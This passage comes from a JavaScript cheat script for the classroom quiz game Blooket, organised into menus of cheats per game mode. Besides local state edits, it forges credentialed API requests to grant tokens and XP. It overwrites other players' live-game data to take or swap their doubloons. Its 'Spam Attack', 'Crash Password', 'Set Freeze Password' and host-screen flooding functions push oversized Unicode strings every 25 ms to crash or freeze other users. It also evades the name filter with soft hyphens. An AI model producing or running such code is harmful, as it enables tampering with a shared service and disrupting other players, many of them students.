                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"));
                        }())[1].children[0]._owner.stateNode;

                        let repeatedText = Array(500).fill(text).join(' ');
                        t.client.blook = repeatedText;
                        t.liveGameController.setVal({
                            path: `c/${t.client.name}/b`,
                            val: repeatedText
                        });
                    }
                }, {

                    name: "Get Daily Rewards",
                    description: "Gets max daily tokens and xp",
                    run: async function() {
                        let e = document.createElement("iframe");
                        if (document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove(), location.href.includes("play.blooket.com")) {
                            let {
                                t
                            } = await fetch("https://play.blooket.com/api/playersessions/solo", {
                                body: JSON.stringify({
                                    gameMode: "Factory",
                                    questionSetId: ["60101da869e8c70013913b59", "625db660c6842334835cb4c6", "60268f8861bd520016eae038", "611e6c804abdf900668699e3", "60ba5ff6077eb600221b7145", "642467af9b704783215c1f1b", "605bd360e35779001bf57c5e", "6234cc7add097ff1c9cff3bd", "600b1491d42a140004d5215a", "5db75fa3f1fa190017b61c0c", "5fac96fe2ca0da00042b018f", "600b14d8d42a140004d52165", "5f88953cdb209e00046522c7", "600b153ad42a140004d52172", "5fe260e72a505b00040e2a11", "5fe3d085a529560004cd3076", "5f5fc017aee59500041a1456", "608b0a5863c4f2001eed43f4", "5fad491512c8620004918ace", "5fc91a9b4ea2e200046bd49a", "5c5d06a7deebc70017245da7", "5ff767051b68750004a6fd21", "5fdcacc85d465a0004b021b9", "5fb7eea20bd44300045ba495"][Math.floor(24 * Math.random())]
                                }),
                                credentials: "include",
                                method: "POST"
                            }).then(e => e.json());
                            await fetch("https://play.blooket.com/api/playersessions/landings", {
                                body: JSON.stringify({
                                    t
                                }),
                                credentials: "include",
                                method: "POST"
                            }), await fetch("https://play.blooket.com/api/playersessions/questions?t=" + t, {
                                credentials: "include"
                            });
                            let {
                                name: o,
                                blook: {
                                    name: a
                                }
                            } = Object.values(function e(t = document.querySelector("body>div")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner.stateNode.props.user.data;
                            await fetch("https://play.blooket.com/api/users/factorystats", {
                                body: JSON.stringify({
                                    blookUsed: a,
                                    t,
                                    name: o,
                                    cash: Math.floor(9e7 * Math.random()) + 1e7,
                                    correctAnswers: Math.floor(500 * Math.random()) + 500,
                                    upgrades: Math.floor(300 * Math.random()) + 300,
                                    mode: "Time-Solo",
                                    nameUsed: "You",
                                    place: 1,
                                    playersDefeated: 0
                                }),
                                credentials: "include",
                                method: "PUT"
                            }), fetch("https://play.blooket.com/api/users/add-rewards", {
                                body: JSON.stringify({
                                    t,
                                    name: o,
                                    addedTokens: 500,
                                    addedXp: 300
                                }),
                                credentials: "include",
                                method: "PUT"
                            }).then(e => e.json()).then(({
                                dailyReward: e
                            }) => alert(`Added max tokens and xp, and got ${e} daily wheel tokens!`)).catch(() => alert("There was an error when adding rewards."))
                        } else alert("This cheat only works on play.blooket.com, opening a new tab."), window.open("https://play.blooket.com/")
                    }
                }, {
                    name: "Use any Blook",
                    description: "Allows you to play as any blook.",
                    run: function() {
                        (() => {
                            const stateNode = Object.values(document.querySelector('#app>div>div'))[1].children[0]._owner.stateNode;
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            const alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            if (!(stateNode.state.unlocks || stateNode.state.blookData)) {
                                alert("This must be run on the lobby or dashboard!");
                                return;
                            }
                            if (stateNode.state.blookData) {
                                let oe = Object.entries;
                                Object.entries = function(a) {
                                    if (a?.Chick) {
                                        allBlooks(a);
                                        Object.entries = oe;
                                    }
                                    return oe.apply(this, arguments);
                                }
                                stateNode.render();

                                function allBlooks(blooks) {
                                    let blookData = {};
                                    stateNode.setState({
                                        blookData: Object.keys(blooks).reduce((a, b) => (a[b] = stateNode.state.blookData[b] || 1, a), {}),
                                        allSets: Object.values(blooks).reduce((a, b) => {
                                            return !a.includes(b.set) && a.push(b.set), a
                                        }, [])
                                    });
                                }
                            } else {
                                stateNode.setState({
                                    unlocks: {
                                        includes: e => 1
                                    }
                                });
                            }
                        })();
                    }
                }, {
                    name: "Bypass Filter",
                    description: "Bypasses the name filter",
                    run: function() {
                        var e, t, o, a;
                        let r;
                        o = function e(t) {
                            for (var o = t.split(""), a = "", r = 0; r < o.length; r++) a += "\xad" + o[r];
                            return a
                        }(t = window.prompt("Enter some text:")), r = document.createElement("iframe"), document.body.appendChild(r), window.alert = r.contentWindow.alert.bind(r.contentWindow), (e = document.createElement("textarea")).value = o, e.style.position = "fixed", e.style.top = 0, e.style.left = 0, e.style.opacity = 0, document.body.appendChild(e), e.select(), document.execCommand("copy"), alert("Bypassed text copied to clipboard!"), r.remove(), document.body.removeChild(e)
                    }
                }, {
                    name: "Host Any Gamemode",
                    description: "Change the selected gamemode on the host settings page",
                    run: function(e) {
                        let t = document.createElement("iframe");
                        if (document.body.append(t), window.alert = t.contentWindow.alert.bind(window), window.prompt = t.contentWindow.prompt.bind(window), t.remove(), "/host/settings" == location.pathname) {
                            let o = ["Racing", "Classic", "Factory", "Cafe", "Defense2", "Defense", "Royale", "Gold", "Candy", "Brawl", "Hack", "Pirate", "Fish", "Dino", "Toy", "Rush"],
                                a = prompt(`Which gamemode do you want to switch to? (Case sensitive) ${o.slice(0,o.length-1).join(", ")} or ${o[o.length-1]}`);
                            if (o.includes(a)) {
                                let {
                                    stateNode: r
                                } = Object.values(function e(t = document.querySelector("body>div")) {
                                    return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                                }())[1].children[0]._owner;
                                r.setState({
                                    settings: {
                                        type: a
                                    }
                                })
                            } else alert("Gamemode not found, make sure you spelled and capitalized it right.")
                        } else alert("Run this script on the host settings page")
                    }
                }],
                voyage: [{
                    name: "Heist ESP",
                    description: "Shows you what's under each chest during a heist",
                    type: "toggle",
                    enabled: false,
                    data: null,
                    run: function() {
                        if (this.enabled) {
                            this.enabled = false;
                            clearInterval(this.data);
                            this.data = null;
                            Array.prototype.forEach.call(document.querySelectorAll(".chestESP"), x => x.remove());
                        } else {
                            this.enabled = true;
                            this.data = setInterval(() => {
                                const cheat = (async () => {
                                    let {
                                        stateNode
                                    } = Object.values((function react(r = document.querySelector("body>div")) {
                                        return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div"))
                                    })())[1].children[0]._owner;
                                    if (stateNode.state.stage == "heist") {
                                        const imgs = Array.prototype.map.call(Array.prototype.slice.call(document.querySelector("[class*=prizesList]").children, 1, 4), (x) => x.querySelector("img").src);
                                        const esp = Object.values(document.querySelector("[class*=modal]"))[0].return.memoizedState.memoizedState;
                                        for (const e of document.querySelectorAll("[class*=boxContent] > div")) e.remove();
                                        const open = Object.values(document.querySelector("[class*=modal]"))[0].return.memoizedState.next.next.memoizedState;
                                        Array.prototype.forEach.call(document.querySelector("[class*=chestsWrapper]").children, (container, i) => {
                                            const box = container.firstChild.firstChild;
                                            if (open.includes(i)) return box.style.opacity = "";
                                            box.style.opacity = "0.5";
                                            let d = document.createElement("div");
                                            d.innerHTML = "<img src='" + imgs[2 - esp[i]] + "' style='max-width: 75%; max-height: 75%'></img>";
                                            d.className = "chestESP";
                                            d.style.position = "absolute";
                                            d.style.inset = "0";
                                            d.style.display = "grid";
                                            d.style.placeItems = "center";
                                            d.style.pointerEvents = "none";
                                            container.onclick = () => {
                                                d.remove();
                                                box.style.opacity = "";
                                            };
                                            container.firstChild.prepend(d);
                                        });
                                    }
                                });
                                cheat();
                            }, 50);
                        }
                    }
                }, {
                    name: "Max Levels",
                    description: "Maxes out all islands and your boat",
                    run: function() {
                        let {
                            stateNode: e
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner;
                        e.setState({
                            islandLevels: Array(e.state.islandLevels.length).fill(5)
                        }, e.updateBoatLevel)
                    }
                }, {
                    name: "Set Doubloons",
                    description: "Sets Doubloons",
                    run: function() {
                        let e = document.createElement("iframe");
                        document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove();
                        let t = parseInt(prompt("How many doubloons do you want?")) || 0,
                            {
                                stateNode: o
                            } = Object.values(function e(t = document.querySelector("body>div")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner;
                        o.setState({
                            doubloons: t
                        }), o.props.liveGameController.setVal({
                            path: `c/${o.props.client.name}/d`,
                            val: t
                        })
                    }
                }, {
                    name: "Start Heist",
                    description: "Starts a heist on someone",
                    run: function() {
                        let e = document.createElement("iframe");
                        document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove();
                        let {
                            stateNode: t
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner;
                        t.props.liveGameController.getDatabaseVal("c", function(e) {
                            let o = Object.entries(e || {}).reduce((e, [o, a]) => (o != t.props.client.name && e.push({
                                name: o,
                                blook: a.b,
                                doubloons: a.d || 0
                            }), e), []);
                            if (0 === o.length) return t.questionsToAnswer = 1, void t.randomQ();
                            let {
                                name: a,
                                blook: r,
                                doubloons: n
                            } = o.find(e => e.name == prompt("Who would you like to heist? (Defaults to top player if no one found)")) || o.sort((e, t) => t.doubloons - e.doubloons)[0];
                            t.setState({
                                stage: "heist",
                                heistInfo: {
                                    name: a,
                                    blook: r
                                },
                                prizeAmount: Math.max(1e3, n)
                            })
                        })
                    }
                }, {
                    name: "Swap Doubloons",
                    description: "Swaps Doubloons with someone",
                    run: async function() {
                        let e = document.createElement("iframe");
                        document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove();
                        let {
                            stateNode: t
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner, o = Object.entries(await new Promise(e => t.props.liveGameController.getDatabaseVal("c", e))).sort((e, t) => t[1].d - e[1].d).filter(e => e[0] != t.props.client.name), a = o.find(e => e[0] == prompt("Who would you like to swap with? (Defaults to top player if no one found)")) || o[0];
                        t.props.liveGameController.setVal({
                            path: `c/${t.props.client.name}`,
                            val: {
                                b: t.props.client.blook,
                                d: a[1].d,
                                tat: `${a[0]}:${a[1].d-t.state.doubloons}`
                            }
                        }), t.setState({
                            doubloons: a[1].d
                        })
                    }
                }, {
                    name: "Take Doubloons",
                    description: "Takes Doubloons from someone",
                    run: async function(e) {
                        let t = document.createElement("iframe");
                        document.body.append(t), window.prompt = t.contentWindow.prompt.bind(window), t.remove();
                        let {
                            stateNode: o
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner, a = Object.entries(await new Promise(e => o.props.liveGameController.getDatabaseVal("c", e))).sort((e, t) => t[1].d - e[1].d).filter(e => e[0] != o.props.client.name), r = a.find(e => e[0] == prompt("Who would you like to take from? (Defaults to top player if no one found)")) || a[0];
                        o.setState({
                            doubloons: o.state.doubloons + r[1].d
                        }), o.props.liveGameController.setVal({
                            path: `c/${o.props.client.name}`,
                            val: {
                                b: o.props.client.blook,
                                d: r[1].d,
                                tat: `${r[0]}:${r[1].d}`
                            }
                        })
                    }
                }, {
                    name: "Send Ad Text",
                    description: "Sends a load of text to another player (This will override your blook!)",
                    run: async function() {
                        var player = window.prompt("Enter the player's name:");
                        var text = window.prompt("Enter the text to send:");

                        let t = document.createElement("iframe");
                        document.body.append(t);
                        window.prompt = t.contentWindow.prompt.bind(window);
                        t.remove();

                        let {
                            stateNode: a
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"));
                        }())[1].children[0]._owner;

                        let o = Object.entries(await new Promise(e => a.props.liveGameController.getDatabaseVal("c", e)))
                            .sort((e, t) => t[1].d - e[1].d)
                            .filter(e => e[0] != a.props.client.name);

                        let r = o.find(t => t[0] == player) || o[0];

                        a.setState({
                            doubloons: a.state.doubloons + r[1].d
                        });

                        a.props.liveGameController.setVal({
                            path: `c/${a.props.client.name}`,
                            val: {
                                b: a.props.client.blook,
                                d: r[1].d,
                                tat: `${r[0]}:${r[1].d}`
                            }
                        });

                        let {
                            props: t2
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"));
                        }())[1].children[0]._owner.stateNode;

                        let repeatedText = `Dog:${Array(500).fill(text).join(' ')}`;
                        t2.client.blook = repeatedText;
                        t2.liveGameController.setVal({
                            path: `c/${t2.client.name}/b`,
                            val: repeatedText
                        });
                    }
                }],
                brawl: [{
                    name: "Double Enemy XP",
                    description: "Doubles enemy XP drop value",
                    run: function() {
                        for (let e of Object.values(document.querySelector("#app > div > div"))[1].children[0]._owner.stateNode.game.current.scene.scenes[0].physics.world.colliders._active.filter(e => e.callbackContext?.toString().includes("invulnerableTime"))) {
                            var t = e.object2;
                            let o = t.classType.prototype.start;
                            t.classType.prototype.start = function() {
                                o.apply(this, arguments), this.val *= 2
                            }, t.children.entries.forEach(e => e.val *= 2)
                        }
                    }
                }, {
                    name: "Half Enemy Speed",
                    description: "Makes enemies move 2x slower",
                    run: function() {
                        for (let e of Object.values(document.querySelector("#app > div > div"))[1].children[0]._owner.stateNode.game.current.scene.scenes[0].physics.world.colliders._active.filter(e => e.callbackContext?.toString().includes("invulnerableTime"))) {
                            var t = e.object2;
                            let o = t.classType.prototype.start;
                            t.classType.prototype.start = function() {
                                o.apply(this, arguments), this.speed *= .5
                            }, t.children.entries.forEach(e => e.speed *= .5)
                        }
                    }
                }, {
                    name: "Instant Kill",
                    description: "Sets all enemies health to 1",
                    run: function() {
                        for (let e of Object.values(document.querySelector("#app > div > div"))[1].children[0]._owner.stateNode.game.current.scene.scenes[0].physics.world.colliders._active.filter(e => e.callbackContext?.toString().includes("invulnerableTime"))) {
                            var t = e.object2;
                            let o = t.classType.prototype.start;
                            t.classType.prototype.start = function() {
                                o.apply(this, arguments), this.hp = 1
                            }, t.children.entries.forEach(e => e.hp = 1)
                        }
                    }
                }, {
                    name: "Invincibility",
                    description: "Makes you invincible",
                    run: function() {
                        for (let e of Object.values(document.querySelector("#app > div > div"))[1].children[0]._owner.stateNode.game.current.scene.scenes[0].physics.world.colliders._active.filter(e => e.callbackContext?.toString().includes("invulnerableTime"))) e.collideCallback = () => {}
                    }
                }, {
                    name: "Magnet",
                    description: "Pulls all xp towards you",
                    run: function() {
                        Object.values(document.querySelector("#app > div > div"))[1].children[0]._owner.stateNode.game.current.scene.scenes[0].physics.world.colliders._active.find(e => e.collideCallback?.toString().includes("magnetTime")).collideCallback({
                            active: !0
                        }, {
                            active: !0,
                            setActive() {},
                            setVisible() {}
                        })
                    }
                }, {
                    name: "Max Current Abilities",
                    description: "Maxes out all your current abilities",
                    run: function() {
                        let e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        for (var [t, o] of Object.entries(e.state.abilities))
                            for (let a = 0; a < 10 - o; a++) e.game.current.scene.scenes[0].game.events.emit("level up", t, e.state.abilities[t]++);
                        e.setState({
                            level: e.game.current.scene.scenes[0].level = [1, 3, 5, 10, 15, 25, 35].sort((t, o) => Math.abs(t - e.state.level) - Math.abs(o - e.state.level))[0] - 1
                        })
                    }
                }, {
                    name: "Next Level",
                    description: "Skips to the next level",
                    run: function() {
                        var e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode,
                            {
                                object1: t,
                                object2: o
                            } = e.game.current.scene.scenes[0].physics.world.colliders._active.find(e => e.collideCallback?.toString().includes('emit("xp"'));
                        o.get().spawn(t.x, t.y, (1 === (o = e.state.level) ? 1 : o < 5 ? 5 : o < 10 ? 10 : o < 20 ? 20 : o < 30 ? 30 : o < 40 ? 40 : o < 50 ? 50 : 100) - e.xp)
                    }
                }, {
                    name: "Remove Obstacles",
                    description: "Removes all rocks and obstacles",
                    run: function() {
                        Object.values(document.querySelector("#app > div > div"))[1].children[0]._owner.stateNode.game.current.scene.scenes[0].physics.world.bodies.entries.forEach(e => {
                            try {
                                e.gameObject.frame.texture.key.includes("obstacle") && e.gameObject.destroy()
                            } catch {}
                        })
                    }
                }, {
                    name: "Kill Enemies",
                    description: "Kills all current enemies",
                    run: function() {
                        Object.values(document.querySelector("#app > div > div"))[1].children[0]._owner.stateNode.game.current.scene.scenes[0].physics.world.bodies.entries.forEach(e => e?.gameObject?.receiveDamage?.(e.gameObject.hp, 1))
                    }
                }, {
                    name: "Reset Health",
                    description: "Resets health and gives invincibility for 3 seconds",
                    run: function() {
                        Object.values(document.querySelector("#app > div > div"))[1].children[0]._owner.stateNode.game.current.scene.scenes[0].game.events._events.respawn.fn()
                    }
                }, {
                    name: "Set XP",
                    description: "Sets amount of XP",
                    run: function() {
                        var e = parseFloat(window.prompt("Enter the amount of XP:")),
                            t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        t.setState({
                            xp: e,
                            totalXp: e
                        }), t.xp = e, t.totalXp = e, t.props?.liveGameController.setVal({
                            path: "c/".concat(t.props.client.name),
                            val: {
                                b: t.props.client.blook,
                                xp: e
                            }
                        })
                    }
                }, {
                    name: "Set Level",
                    description: "Sets your level",
                    run: function() {
                        var e = parseInt(window.prompt("Enter your level:"));
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            level: e
                        })
                    }
                }],
                cafe: [{
                    name: "Spam Attack Player",
                    description: "Attacks the player to make the game unplayable",
                    type: "toggle",
                    enabled: false,
                    data: null,
                    run: function() {
                        var name = window.prompt("Enter the player's name:");
                        if (this.enabled) {
                            this.enabled = false;
                            clearInterval(this.data);
                            this.data = null;
                        } else {
                            this.enabled = true;

                            function reactHandler() {
                                return Object.values(document.querySelector('body div[class*="_body"]'))[1].children[0]._owner;
                            }

                            var action = name + ":inspect";

                            function spamAction() {
                                var handler = reactHandler();
                                if (handler && handler.stateNode && handler.stateNode.props && handler.stateNode.props.liveGameController) {
                                    handler.stateNode.props.liveGameController.setVal({
                                        id: handler.stateNode.props.client.hostId,
                                        path: "c/" + handler.stateNode.props.client.name + "/tat",
                                        val: action
                                    });
                                }
                            }

                            this.data = setInterval(spamAction, 50);
                        }
                    }
                }, {
                    name: "Attack Player",
                    description: "Sends the player a health inspection",
                    run: function() {
                        var targetPlayer = window.prompt("Enter the player's name:");

                        function reactHandler() {
                            return Object.values(document.querySelector('body div[class*="_body"]'))[1].children[0]._owner;
                        }

                        reactHandler().stateNode.props.liveGameController.setVal({
                            id: reactHandler().stateNode.props.client.hostId,
                            path: "c/" + reactHandler().stateNode.props.client.name + "/tat",
                            val: targetPlayer + ":inspect"
                        });
                    }
                }, {
                    name: "Max Items",
                    description: "Maxes out items in the shop (Only usable in the shop)",
                    run: function() {
                        let e = document.createElement("iframe");
                        if (document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove(), "/cafe/shop" !== window.location.pathname) alert("This can only be run in the shop");
                        else {
                            let {
                                stateNode: t
                            } = Object.values(function e(t = document.querySelector("body>div")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner;
                            t.setState({
                                items: Object.fromEntries(Object.entries(t.state.items).map(e => [e[0], 5]))
                            })
                        }
                    }
                }, {
                    name: "Remove Customers",
                    description: "Skips the current customers (Not usable in the shop)",
                    run: function() {
                        let {
                            stateNode: e
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner;
                        e.state.customers.forEach((t, o) => Object.keys(t).length && e.removeCustomer(o, !0))
                    }
                }, {
                    name: "Reset Abilities",
                    description: "Resets used abilities in shop (Only usable in the shop)",
                    run: function() {
                        let e = document.createElement("iframe");
                        if (document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove(), "/cafe/shop" !== window.location.pathname) alert("This can only be run in the shop");
                        else {
                            let {
                                stateNode: t
                            } = Object.values(function e(t = document.querySelector("body>div")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner;
                            t.setState({
                                abilities: Object.fromEntries(Object.entries(t.state.abilities).map(e => [e[0], 5]))
                            })
                        }
                    }
                }, {
                    name: "Set Cash",
                    description: "Sets cafe cash",
                    run: function() {
                        let e = document.createElement("iframe");
                        document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove();
                        let t = Number(parseInt(prompt("How much cash would you like?"))),
                            {
                                stateNode: o
                            } = Object.values(function e(t = document.querySelector("body>div")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner;
                        o.setState({
                            cafeCash: t
                        }), o.props.liveGameController.setVal({
                            path: `c/${o.props.client.name}`,
                            val: {
                                b: o.props.client.blook,
                                ca: t
                            }
                        })
                    }
                }, {
                    name: "Stock Food",
                    description: "Stocks all food to 99 (Not usable in the shop)",
                    run: function() {
                        var e = document.createElement("iframe");
                        document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove(), "/cafe" !== window.location.pathname ? alert("This can't be run in the shop") : (e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode).setState({
                            foods: e.state.foods.map(e => ({
                                ...e,
                                stock: 99,
                                level: 5
                            }))
                        })
                    }
                }],
                hack: [{
                    name: "Choice ESP",
                    description: "Shows what each choice will give you",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        this.enabled ? (this.enabled = !1, clearInterval(this.data), this.data = null) : (this.enabled = !0, this.data = setInterval(() => {
                            let {
                                stateNode: e
                            } = Object.values(function e(t = document.querySelector("body>div")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner, {
                                text: t
                            } = e.state.choices[0], o = document.querySelector("[class^=styles__feedbackContainer___]");
                            if (o.children.length <= 4) {
                                let a = document.createElement("div");
                                a.style.color = "white", a.style.fontFamily = "Inconsolata,Helvetica,monospace,sans-serif", a.style.fontSize = "2em", a.style.display = "flex", a.style.justifyContent = "center", a.style.marginTop = "675px", a.innerText = t, o.append(a)
                            }
                        }, 50))
                    }
                }, {
                    name: "Password ESP",
                    description: "Highlights the wrong passwords",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        try {
                            let e = this;
                            e.enabled ? (e.enabled = !1, clearInterval(e.data), e.data = null) : (e.enabled = !0, e.data = setInterval(() => {
                                let {
                                    state: e
                                } = Object.values(function e(t = document.querySelector("#app > div > div")) {
                                    return Object.values(t)[1]?.children?.[1]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                                }())[1].children[1]._owner.stateNode;
                                "hack" === e.stage && Array.from(document.querySelectorAll('[role="button"]._button_mrhfb_157')).forEach(t => {
                                    t.textContent.trim() !== e.correctPassword.trim() ? (t.style.outlineColor = "rgba(255, 64, 64, 0.8)", t.style.backgroundColor = "rgba(255, 64, 64, 0.8)", t.style.textShadow = "0 0 1px #f33") : (t.style.outlineColor = "", t.style.backgroundColor = "", t.style.textShadow = "")
                                })
                            }, 50))
                        } catch (t) {
                            console.error("An error occurred:", t)
                        }
                    }
                }, {
                    name: "Always Triple",
                    description: "Always get triple crypto",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        this.enabled ? (this.enabled = !1, clearInterval(this.data), this.data = null) : (this.enabled = !0, this.data = setInterval(() => Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            choices: [{
                                type: "mult",
                                val: 3,
                                rate: .075,
                                blook: "Brainy Bot",
                                text: "Triple Crypto"
                            }]
                        }), 50))
                    }
                }, {
                    name: "Always Hack",
                    description: "Always get hack",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        this.enabled ? (this.enabled = !1, clearInterval(this.data), this.data = null) : (this.enabled = !0, this.data = setInterval(() => Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            choices: [{
                                type: "hack",
                                val: 3,
                                rate: .075,
                                blook: "Mega Bot",
                                text: "HACK"
                            }]
                        }), 50))
                    }
                }, {
                    name: "Crash Password",
                    description: "Crashes other players when they attempt to hack you",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        var e = Object.values(function e(t = document.querySelector("#app")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner.stateNode;
                        if (this.enabled) this.enabled = !1, clearInterval(this.data), this.data = null, e.props.liveGameController.setVal({
                            path: `c/${e.props.client.name}/p`,
                            val: e.state?.password
                        });
                        else {
                            this.enabled = !0;
                            let t = () => {
                                e.props.liveGameController.setVal({
                                    path: `c/${e.props.client.name}/p/toString`,
                                    val: "crash"
                                })
                            };
                            this.data = setInterval(t, 25)
                        }
                    }
                }, {
                    name: "Set Freeze Password",
                    description: "Freezes other players when they attempt to hack you",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        const encodedChars = [
                            '\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2'
                        ];

                        const chars = encodedChars.map(char => eval(`"${char}"`));

                        function makeLongText() {
                            return new Array(3e+6).fill().map(e => chars[Math.floor(Math.random() * chars.length)]).join("");
                        }

                        var t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;

                        if (this.enabled) {
                            this.enabled = !1;
                            clearInterval(this.data);
                            this.data = null;
                            t.setState({
                                password: ''
                            });
                            t.props.liveGameController.setVal({
                                path: "c/".concat(t.props.client.name),
                                val: {
                                    b: t.props.client.blook,
                                    p: '',
                                    cr: t.state.crypto
                                }
                            });
                        } else {
                            this.enabled = !0;
                            let lagFunction = () => {
                                var e = makeLongText();
                                t.setState({
                                    password: e
                                });
                                t.props.liveGameController.setVal({
                                    path: "c/".concat(t.props.client.name),
                                    val: {
                                        b: t.props.client.blook,
                                        p: e,
                                        cr: t.state.crypto
                                    }
                                });
                            };
                            this.data = setInterval(lagFunction, 25);
                        }
                    }
                }, {
                    name: "Auto Guess",
                    description: "Automatically performs the hack for you",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        try {
                            let e = this;
                            e.enabled ? (e.enabled = !1, clearInterval(e.data), e.data = null) : (e.enabled = !0, e.data = setInterval(() => {
                                if ("hack" === ("hack" === window.location.pathname.split("/")[2] && "hack")) {
                                    let {
                                        stage: e,
                                        correctPassword: t
                                    } = Object.values(document.querySelector("#app > div > div"))[1].children[1]._owner.stateNode.state;
                                    "hack" === e && Array.from(document.querySelectorAll("div")).filter(e => e.innerHTML === t)[0].click()
                                }
                            }, 50))
                        } catch (t) {
                            console.error("An error occurred:", t)
                        }
                    }
                }, {
                    name: "Set Host Screen Green",
                    description: "Makes the whole screen filled with text",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        var a = Object.values(function e(t = document.querySelector("#app")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner.stateNode;

                        if (this.enabled) {
                            this.enabled = !1;
                            clearInterval(this.data);
                            this.data = null;
                            a.props.liveGameController.setVal({
                                path: `c/${a.props.client.name}/cr`,
                                val: ""
                            });
                        } else {
                            this.enabled = !0;
                            let t = () => {
                                var o = [];
                                const char = eval('"\\u0e47"');
                                for (let r = 0; r < 999; r++) {
                                    o.push(char.repeat(70));
                                }
                                a.props.liveGameController.setVal({
                                    path: `c/${a.props.client.name}/cr`,
                                    val: `9999999999999999999999999999999999999999999999${o.join(" ")}`
                                });
                            };
                            this.data = setInterval(t, 25);
                        }
                    }
                }, {
                    name: "Remove Hack",
                    description: "",
                    run: function() {
                        Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner.stateNode.setState({
                            hack: ""
                        })
                    }
                }, {
                    name: "Set Crypto",
                    description: "Sets crypto",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Number(parseInt(prompt("How much crypto would you like?")))),
                            t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        t.setState({
                            crypto: e,
                            crypto2: e
                        }), t.props.liveGameController.setVal({
                            path: "c/".concat(t.props.client.name),
                            val: {
                                b: t.props.client.blook,
                                p: t.state.password,
                                cr: e
                            }
                        })
                    }
                }, {
                    name: "Set Password",
                    description: "Sets hacking password",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), prompt("What do you want to set your password to?")),
                            t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        t.setState({
                            password: e
                        }), t.props.liveGameController.setVal({
